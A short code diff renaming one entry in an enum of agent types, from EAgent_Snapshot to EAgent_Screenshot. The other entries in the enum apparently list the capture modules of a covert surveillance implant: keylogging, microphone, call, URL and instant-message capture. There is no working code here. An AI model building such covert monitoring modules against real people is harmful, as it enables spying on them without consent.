@@ -50,7 +50,7 @@ enum TAgentType
 	EAgent_Call_TODO,						// ***
 	EAgent_CallLocal,						// ***
 	EAgent_Keylog = 0x1008,
-	EAgent_Snapshot = 0x1009,				// ***
+	EAgent_Screenshot = 0x1009,				// ***
 	EAgent_URL_TODO,
 	EAgent_IM_TODO = 0x100b,
 	EAgent_Mic = 0x100D,					// ***
